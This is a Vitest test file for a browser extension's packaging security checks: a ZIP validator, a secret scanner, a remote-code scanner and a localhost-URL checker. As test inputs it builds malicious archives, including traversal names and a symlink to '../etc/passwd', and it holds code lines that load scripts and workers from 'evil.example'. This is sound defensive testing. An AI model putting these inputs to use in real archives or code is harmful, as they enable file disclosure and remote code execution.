import { describe, expect, it, afterEach } from 'vitest'
import { rmSync, unlinkSync } from 'node:fs'
import { join } from 'node:path'
import {
  inspectZipCentralDirectory,
  validateZipEntryName,
  extractZipToTemp,
  cleanupExtractDir,
} from '../scripts/zip-byte-validate.mjs'
import {
  writeRawZip,
  ZIP_UNIX_SYMLINK_ATTRS,
} from '../scripts/malicious-zip-fixtures.mjs'
import { makePrivateTempDir } from '../scripts/lib/private-temp.mjs'
import { scanRemoteCodePatterns } from '../scripts/remote-code-scan.mjs'
import { scanArchiveEntryBytes } from '../scripts/archive-byte-scan.mjs'
import { targetArtifactNames } from '../scripts/extension-package-lib.mjs'
import { findSiblingFileDependencies } from '../scripts/check-public-source-readiness.mjs'
import {
  findForbiddenBackendUrlHits,
  isForbiddenBackendHostname,
  countBareLocalhostSentinel,
} from '../streampulse-web/scripts/check-backend-url.mjs'

const tempDirs: string[] = []

function privateZipPath(name: string): string {
  const dir = makePrivateTempDir('sp-rpr2-')
  tempDirs.push(dir)
  return join(dir, name)
}

afterEach(() => {
  while (tempDirs.length > 0) {
    const dir = tempDirs.pop()
    if (dir) {
      try {
        rmSync(dir, { recursive: true, force: true })
      } catch {
        // ignore
      }
    }
  }
})

async function writeZipAsync(path: string, entries: Record<string, string>) {
  const { createWriteStream } = await import('node:fs')
  const yazl = await import('yazl')
  await new Promise<void>((resolve, reject) => {
    const zipfile = new yazl.ZipFile()
    for (const [name, content] of Object.entries(entries)) {
      zipfile.addBuffer(Buffer.from(content), name)
    }
    zipfile.outputStream.pipe(createWriteStream(path, { mode: 0o600 })).on('close', resolve).on('error', reject)
    zipfile.end()
  })
}

describe('zip entry name rejection', () => {
  it('rejects empty, absolute, traversal, backslash, control, drive', () => {
    expect(validateZipEntryName('')).toMatch(/empty/)
    expect(validateZipEntryName('/abs')).toMatch(/leading slash/)
    expect(validateZipEntryName('../x')).toMatch(/traversal/)
    expect(validateZipEntryName('a\\b')).toMatch(/backslash/)
    expect(validateZipEntryName('a\0b')).toMatch(/NUL/)
    expect(validateZipEntryName('C:/x')).toMatch(/drive-letter/)
    expect(validateZipEntryName('ok/file.js')).toBeNull()
  })
})

describe('malicious ZIP fixtures', () => {
  it('rejects case-conflicting entries', async () => {
    const path = privateZipPath('dup.zip')
    await writeZipAsync(path, { 'manifest.json': '{}', 'Manifest.json': '{}' })
    const { errors } = await inspectZipCentralDirectory(path)
    expect(errors.some((e) => /case-insensitive|duplicate/i.test(e))).toBe(true)
    unlinkSync(path)
  })

  it('rejects exact duplicate names', async () => {
    const path = privateZipPath('exdup.zip')
    const payload = Buffer.from('one')
    writeRawZip(path, [
      { name: 'a.js', data: payload },
      { name: 'a.js', data: Buffer.from('two') },
    ])
    const { errors } = await inspectZipCentralDirectory(path)
    expect(errors.some((e) => /duplicate entry:\s*a\.js/i.test(e))).toBe(true)
    unlinkSync(path)
  })

  it('rejects symlink entries', async () => {
    const path = privateZipPath('symlink.zip')
    writeRawZip(path, [
      {
        name: 'link.txt',
        data: Buffer.from('../etc/passwd'),
        externalAttrs: ZIP_UNIX_SYMLINK_ATTRS,
      },
    ])
    const { errors } = await inspectZipCentralDirectory(path)
    expect(errors.some((e) => /symlink entry forbidden/i.test(e))).toBe(true)
    unlinkSync(path)
  })

  it('rejects encrypted entries', async () => {
    const path = privateZipPath('enc.zip')
    // Encrypted flag with empty stored payload — yauzl may reject before attribute checks;
    // inspector must surface that as a validation error (not an uncaught throw).
    writeRawZip(path, [
      {
        name: 'secret.txt',
        data: Buffer.alloc(0),
        gpFlag: 0x1,
        declaredCompressed: 0,
        declaredUncompressed: 0,
      },
    ])
    const { errors } = await inspectZipCentralDirectory(path)
    expect(
      errors.some(
        (e) => /encrypted entry forbidden/i.test(e) || /zip (open|read|entry) failed|encrypted/i.test(e),
      ),
    ).toBe(true)
    unlinkSync(path)
  })

  it('rejects entry-count limit', async () => {
    const path = privateZipPath('count.zip')
    const entries = {}
    for (let i = 0; i < 12; i++) entries[`f${i}.txt`] = 'x'
    await writeZipAsync(path, entries)
    const { errors } = await inspectZipCentralDirectory(path, {
      maxEntries: 5,
      maxEntryUncompressedBytes: 25 * 1024 * 1024,
      maxTotalUncompressedBytes: 80 * 1024 * 1024,
      minCompressionRatio: 0.001,
    })
    expect(errors.some((e) => /excessive entry count/i.test(e))).toBe(true)
    unlinkSync(path)
  })

  it('rejects per-entry size limit', async () => {
    const path = privateZipPath('size.zip')
    await writeZipAsync(path, { 'big.bin': 'abcdefghij' })
    const { errors } = await inspectZipCentralDirectory(path, {
      maxEntries: 500,
      maxEntryUncompressedBytes: 4,
      maxTotalUncompressedBytes: 80 * 1024 * 1024,
      minCompressionRatio: 0.001,
    })
    expect(errors.some((e) => /entry too large/i.test(e))).toBe(true)
    unlinkSync(path)
  })

  it('rejects total size limit', async () => {
    const path = privateZipPath('total.zip')
    await writeZipAsync(path, { a: 'aaaa', b: 'bbbb' })
    const { errors } = await inspectZipCentralDirectory(path, {
      maxEntries: 500,
      maxEntryUncompressedBytes: 25 * 1024 * 1024,
      maxTotalUncompressedBytes: 6,
      minCompressionRatio: 0.001,
    })
    expect(errors.some((e) => /total uncompressed/i.test(e))).toBe(true)
    unlinkSync(path)
  })

  it('throws on declared uncompressed-size mismatch during extract', async () => {
    const path = privateZipPath('declared.zip')
    // Valid stored zip from yazl, then patch central+local uncompressed size fields.
    await writeZipAsync(path, { 'hello.txt': 'hello-world' })
    const buf = Buffer.from(await import('node:fs').then((fs) => fs.readFileSync(path)))
    // Local header uncompressed size at offset 22; central at variable offset — patch both
    // occurrences of the real size (11) that sit in size fields by rewriting known offsets.
    // Local file header: signature(4)+ver(2)+flag(2)+method(2)+time(2)+date(2)+crc(4)+comp(4)+uncomp(4)
    const realSize = Buffer.byteLength('hello-world')
    expect(buf.readUInt32LE(22)).toBe(realSize)
    buf.writeUInt32LE(realSize + 50, 22)
    // Find central directory header and patch uncompressed size (offset 24 within central header).
    const centralSig = Buffer.from([0x50, 0x4b, 0x01, 0x02])
    const cdir = buf.indexOf(centralSig)
    expect(cdir).toBeGreaterThan(0)
    expect(buf.readUInt32LE(cdir + 24)).toBe(realSize)
    buf.writeUInt32LE(realSize + 50, cdir + 24)
    const { writeFileSync } = await import('node:fs')
    writeFileSync(path, buf)

    await expect(extractZipToTemp(path)).rejects.toThrow(
      /declared uncompressed-size mismatch|compressed\/uncompressed size mismatch|not enough bytes in the stream/i,
    )
    unlinkSync(path)
  })

  it('returns empty extractDir when central-directory validation rejects', async () => {
    const path = privateZipPath('cleanup.zip')
    // Absolute path entry — rejected by name validator / yauzl; must not leave extractDir.
    writeRawZip(path, [
      { name: '/abs/evil.txt', data: Buffer.from('x') },
    ])
    const { extractDir, errors } = await extractZipToTemp(path)
    expect(errors.length).toBeGreaterThan(0)
    expect(extractDir).toBe('')
    unlinkSync(path)
  })

  it('extracts clean zip', async () => {
    const path = privateZipPath('clean.zip')
    await writeZipAsync(path, { 'hello.txt': 'hi' })
    const { extractDir, files, errors } = await extractZipToTemp(path)
    expect(errors).toEqual([])
    expect(files['hello.txt'].toString()).toBe('hi')
    cleanupExtractDir(extractDir)
    unlinkSync(path)
  })
})

describe('archive byte scan', () => {
  it('flags private key in unusual extension and env canaries', () => {
    const key = scanArchiveEntryBytes(
      'hidden.dat',
      Buffer.from('-----BEGIN RSA PRIVATE KEY-----\nMIIE'),
    )
    expect(key.ok).toBe(false)
    expect(key.hits.some((h) => h.ruleId === 'private-key-header')).toBe(true)

    const env = scanArchiveEntryBytes('notes.pem', Buffer.from('TWITCH_CLIENT_SECRET=supersecretvalue\n'))
    expect(env.ok).toBe(false)
    expect(env.hits.some((h) => h.ruleId === 'env-credential-assignment')).toBe(true)

    const bearer = scanArchiveEntryBytes(
      'x.bin',
      Buffer.from('Authorization: Bearer abcdefghijklmnopqrstuvwxyz012345'),
    )
    expect(bearer.ok).toBe(false)
    expect(bearer.hits.some((h) => h.ruleId === 'bearer-token-canary')).toBe(true)
  })

  it('flags absolute machine paths and sibling paths in store mode', () => {
    const abs = scanArchiveEntryBytes(
      'help.txt',
      Buffer.from('path=/Users/aron/streampulse/foo'),
    )
    expect(abs.hits.some((h) => h.ruleId === 'absolute-machine-path')).toBe(true)

    const sib = scanArchiveEntryBytes(
      'a.js',
      Buffer.from('file:../streampulse-backend/packages/x'),
      { store: true },
    )
    expect(sib.hits.some((h) => h.ruleId === 'sibling-private-path')).toBe(true)
  })

  it('does not log secret values in hit payloads', () => {
    const secret = 'super-secret-client-value-xyz'
    const result = scanArchiveEntryBytes('x.env', Buffer.from(`CLIENT_SECRET=${secret}`))
    const serialized = JSON.stringify(result.hits)
    expect(serialized).not.toContain(secret)
    expect(result.hits.every((h) => h.ruleId && h.file)).toBe(true)
  })
})

describe('remote code scan', () => {
  it('flags eval, Function forms, timers, workers, wasm, and importScripts', () => {
    expect(scanRemoteCodePatterns('eval("x")').ok).toBe(false)
    expect(scanRemoteCodePatterns('new Function("return 1")').ok).toBe(false)
    expect(scanRemoteCodePatterns('Function("return 1")').ok).toBe(false)
    expect(scanRemoteCodePatterns('window.Function("x")').ok).toBe(false)
    expect(scanRemoteCodePatterns('globalThis.Function("x")').ok).toBe(false)
    expect(scanRemoteCodePatterns('setTimeout("x", 1)').ok).toBe(false)
    expect(scanRemoteCodePatterns('setInterval(`x`, 1)').ok).toBe(false)
    expect(scanRemoteCodePatterns('import("https://evil.example/x.js")').ok).toBe(false)
    expect(scanRemoteCodePatterns('import x from "https://evil.example/x.js"').ok).toBe(false)
    expect(scanRemoteCodePatterns('importScripts("a.js")').ok).toBe(false)
    expect(scanRemoteCodePatterns('new Worker("https://evil.example/w.js")').ok).toBe(false)
    expect(scanRemoteCodePatterns('new SharedWorker("https://evil.example/w.js")').ok).toBe(false)
    expect(scanRemoteCodePatterns('WebAssembly.instantiate(buf)').ok).toBe(false)
    expect(scanRemoteCodePatterns('WebAssembly.instantiateStreaming(r)').ok).toBe(false)
    expect(scanRemoteCodePatterns('WebAssembly.compile(buf)').ok).toBe(false)
    expect(scanRemoteCodePatterns('WebAssembly.compileStreaming(r)').ok).toBe(false)
    expect(
      scanRemoteCodePatterns('el=document.createElement("script");el.src="https://evil.example/a.js"').ok,
    ).toBe(false)
  })

  it('allows ordinary HTTPS API fetches', () => {
    expect(scanRemoteCodePatterns('fetch("https://api.streampulse.stream/v1/x")').ok).toBe(true)
  })
})

describe('artifact names', () => {
  it('uses distinct cws/edge filenames', () => {
    const cws = targetArtifactNames('cws', '0.1.0')
    const edge = targetArtifactNames('edge', '0.1.0')
    expect(cws.zipName).toBe('streampulse-extension-cws-0.1.0.zip')
    expect(edge.zipName).toBe('streampulse-extension-edge-0.1.0.zip')
    expect(cws.zipName).not.toBe(edge.zipName)
  })
})

describe('RPR-6 public source readiness', () => {
  it('reports escaping sibling file: deps without claiming RPR-2 solved them', () => {
    const hits = findSiblingFileDependencies({
      dependencies: {
        '@streampulse/pulse-core': 'file:../streampulse-backend/packages/pulse-core',
      },
    })
    expect(hits.length).toBe(1)
    expect(hits[0].spec).toContain('streampulse-backend')
  })

  it('passes when only in-repo file:packages/* remain (after RPR-6 wiring)', () => {
    const hits = findSiblingFileDependencies()
    expect(hits).toEqual([])
  })
})

describe('portal local-origin scanner helpers', () => {
  it('rejects loopback variants and local aliases', () => {
    expect(isForbiddenBackendHostname('localhost')).toBe(true)
    expect(isForbiddenBackendHostname('foo.localhost')).toBe(true)
    expect(isForbiddenBackendHostname('127.0.0.1')).toBe(true)
    expect(isForbiddenBackendHostname('127.1')).toBe(true)
    expect(isForbiddenBackendHostname('::1')).toBe(true)
    expect(isForbiddenBackendHostname('0.0.0.0')).toBe(true)
    expect(isForbiddenBackendHostname('laptopworker')).toBe(true)
    expect(isForbiddenBackendHostname('api.streampulse.stream')).toBe(false)
  })

  it('treats bare localhost as forbidden (no React Router exemption)', () => {
    const hits = findForbiddenBackendUrlHits(
      'const a="http://localhost:8081/v1"; const b="http://127.0.0.1/"; const c="http://localhost"',
    )
    expect(hits.some((h) => h.includes('8081'))).toBe(true)
    expect(hits.some((h) => h.includes('127.0.0.1'))).toBe(true)
    expect(hits).toContain('http://localhost')
    expect(countBareLocalhostSentinel('xxhttp://localhostyy')).toBe(1)
  })
})
